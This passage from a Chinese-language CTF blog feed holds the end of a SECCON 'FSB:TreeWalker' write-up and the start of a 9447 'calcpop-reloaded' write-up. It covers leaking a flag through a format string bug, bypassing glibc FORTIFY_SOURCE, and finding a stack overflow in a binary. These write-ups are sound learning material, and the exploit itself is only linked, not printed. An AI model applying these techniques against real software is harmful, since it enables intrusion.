+&lt;p&gt;这一部分的具体输入规则是，先输入&lt;code class=&quot;highlighter-rouge&quot;&gt;'\x00\x10\x00\x00'&lt;/code&gt;，然后输入 0x1000 个字符(format string)… 两步循环。&lt;/p&gt;
+
+&lt;h3 id=&quot;wheres-the-flag&quot;&gt;Where’s the flag?&lt;/h3&gt;
+
+&lt;p&gt;一开始找到 FSB，我想可能很简单，直接打印栈中的 flag 就好了。但是有这样一段代码把 flag 给覆盖了：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objdump&quot; data-lang=&quot;objdump&quot;&gt;40084d:	48 b8 cc cc cc cc cc 	movabs $0xcccccccccccccccc,%rax
+400854:	cc cc cc
+400857:	48 89 44 24 10       	mov    %rax,0x10(%rsp)
+40085c:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
+400861:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
+400866:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
+40086b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
+400870:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
+400875:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
+40087a:	48 89 44 24 48       	mov    %rax,0x48(%rsp)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;还是老老实实看 construct_tree() 吧。&lt;/p&gt;
+
+&lt;h3 id=&quot;construct_tree&quot;&gt;construct_tree()&lt;/h3&gt;
+
+&lt;p&gt;IDA decompile 的 C 代码:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* .calloc */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* .strlen */&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_tree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r14_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r13_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r15_5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r12d8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;r14_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r13_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r13_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;rax4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r15_5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;rax7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r14_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;r12d8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r14_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;ebx9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;rax10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int1_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r12d8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebx9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebx9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebx9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebx9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r13_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;rax11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r14_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r13_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;rbp6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r15_5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;这段代码很简单，就是依据 flag 中各个字符每个 bit 的值构造一个二叉树。然后这个树的根的的地址会在 main 函数中打印出来。&lt;/p&gt;
+
+&lt;h3 id=&quot;exppy&quot;&gt;exp.py&lt;/h3&gt;
+
+&lt;p&gt;我在比赛中用的 leak 一次只能 leak 一个字符，赛后重写改进了一下，能 leak 4 个字符，稍微加快一点。&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/a3ce8d93cb4860500090&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/a3ce8d93cb4860500090&quot;&gt;cubarco/a3ce8d93cb4860500090&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;一开始我准备用&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;%31$s&quot;&lt;/code&gt;直接 printf, 但是会报&lt;code class=&quot;highlighter-rouge&quot;&gt;*** invalid %N$ use detected ***&lt;/code&gt;. 这是由于 Glibc 的 FORTIFY_SOURCE, 可以绕过，具体方法看&lt;a href=&quot;http://phrack.org/issues/67/9.html&quot;&gt;这篇文章&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;the-end&quot;&gt;The end?&lt;/h3&gt;
+
+&lt;p&gt;其实 FSB 最严重的问题是用类似&lt;code class=&quot;highlighter-rouge&quot;&gt;%N$n&lt;/code&gt;的 format string 能够实现将任意值写入指定 offset 的栈中。但是 Glibc 的 FORTIFY_SOURCE 解决(?)了这个问题。但是&lt;a href=&quot;http://phrack.org/issues/67/9.html&quot;&gt;这篇文章&lt;/a&gt;好像还是有办法绕过&lt;del&gt;虽然我还没成功&lt;/del&gt;。&lt;/p&gt;
+
+&lt;h6 id=&quot;update-2015-12-13&quot;&gt;Update 2015-12-13&lt;/h6&gt;
+
+&lt;p&gt;phrack 上的那篇&lt;a href=&quot;http://phrack.org/issues/67/9.html&quot;&gt;文章&lt;/a&gt;是 2010 年的，之后在 2012 年，glibc 打了一个 &lt;a href=&quot;http://repo.or.cz/glibc.git/commit/7c1f4834d398163d1ac8101e35e9c36fc3176e6e&quot;&gt;patch&lt;/a&gt;, 用&lt;code class=&quot;highlighter-rouge&quot;&gt;width_arg&lt;/code&gt;盖掉&lt;code class=&quot;highlighter-rouge&quot;&gt;stdout-&amp;gt;_flags2&lt;/code&gt;上&lt;code class=&quot;highlighter-rouge&quot;&gt;_IO_FLAGS2_FORTIFY&lt;/code&gt;标志位的办法已经行不通了。&lt;/p&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;http://phrack.org/issues/67/9.html&quot;&gt;A Eulogy for Format Strings&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://repo.or.cz/glibc.git/commit/7c1f4834d398163d1ac8101e35e9c36fc3176e6e&quot;&gt;glibc.git / commit / 7c1f4834d398163d1ac8101e35e9c36fc3176e6e&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/&quot;&gt;Writeup-Seccon CTF: FSB:TreeWalker&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on December 07, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup-9447 CTF: calcpop-reloaded]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/12/9477-calcpop-reloaded-writeup/" />
+  <id>https://cubl.in/blog/2015/12/9477-calcpop-reloaded-writeup</id>
+  <published>2015-12-04T00:00:00+00:00</published>
+  <updated>2015-12-04T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;&lt;em&gt;从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的）&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣…），硬着头皮写篇 writeup 记录一下。&lt;/p&gt;
+
+&lt;h3 id=&quot;load-address&quot;&gt;Load Address&lt;/h3&gt;
+&lt;p&gt;找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到&lt;code class=&quot;highlighter-rouge&quot;&gt;mov eax, 0x1007a7&lt;/code&gt;这类代码，大概可以猜出 load address 在 0x100000.&lt;/p&gt;
+
+&lt;p&gt;用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc.&lt;/p&gt;
+
+&lt;h3 id=&quot;overflow&quot;&gt;Overflow&lt;/h3&gt;
+&lt;p&gt;接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。&lt;/p&gt;
+
+&lt;p&gt;这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用&lt;code class=&quot;highlighter-rouge&quot;&gt;shutdown()&lt;/code&gt;之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。&lt;/p&gt;
+
+&lt;p&gt;接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span class=&quot;c1&quot;&gt;; entry:&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;and&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0FFFFFFF0h&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;; exit:&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;10h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
